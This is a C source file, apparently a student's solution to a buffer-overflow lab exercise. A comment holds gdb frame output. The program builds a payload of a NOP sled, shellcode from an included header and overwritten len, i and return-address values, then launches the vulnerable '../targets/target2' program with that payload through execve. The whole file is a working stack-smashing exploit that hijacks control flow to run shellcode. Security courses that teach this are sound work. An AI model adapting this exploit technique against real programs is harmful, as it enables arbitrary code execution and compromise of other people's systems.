#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

/*
(gdb) info frame
Stack level 0, frame at 0x3021fea0:
 rip = 0x400bcf in foo (target2.c:27); 
    saved rip = 0x400c45
 called by frame at 0x3021fed0
 source language c.
 Arglist at 0x3021fe90, args: arg=0x7fffffffd7ad "test"
 Locals at 0x3021fe90, Previous frame's sp is 0x3021fea0
 Saved registers:
  rbp at 0x3021fe90, rip at 0x3021fe98
(gdb) p &buf
$1 = (char (*)[256]) 0x3021fd80
(gdb) p &i
$2 = (int *) 0x3021fe8c
(gdb) p &len
$3 = (int *) 0x3021fe88
*/
#define TARGET "../targets/target2"
#define BUF_SIZE 285
#define RA_ADDR_OFFEST 280
#define NOP '\x90'
#define SHELLCODE_LEN 45
#define NUM_NOP 19
#define NEW_RA_ADDRESS 0x3021fd80
#define NEW_I 0x0000010C
#define NEW_LEN 0x0000011C

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[4];

	char attacker_string[BUF_SIZE];

	// fill begining with NOP
	int idx = 0;
	for(; idx < NUM_NOP; idx++)
	{
		attacker_string[idx] = NOP;
	}

	// fill with shellcode
	for(; idx < NUM_NOP + SHELLCODE_LEN; idx++)
	{
		attacker_string[idx] = shellcode[idx - NUM_NOP];
	}

	// fill rest with NOP
	for(; idx < RA_ADDR_OFFEST; idx++)
	{
		attacker_string[idx] = NOP;
	}

	// overwrite len
	*(int*) (&(attacker_string[264])) = NEW_LEN;

	// overwrite i
	*(int*) (&(attacker_string[268])) = NEW_I;

	*(int*) (&attacker_string[280]) = NEW_RA_ADDRESS;

	attacker_string[BUF_SIZE - 1] = '\0';


	args[0] = TARGET;
	args[1] = attacker_string;
	args[2] = NULL;

	// env[0] = NULL;
	env[0] = &attacker_string[267];
	env[1] = &attacker_string[268];
	env[2] = &attacker_string[271];
	env[3] = &attacker_string[272];

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
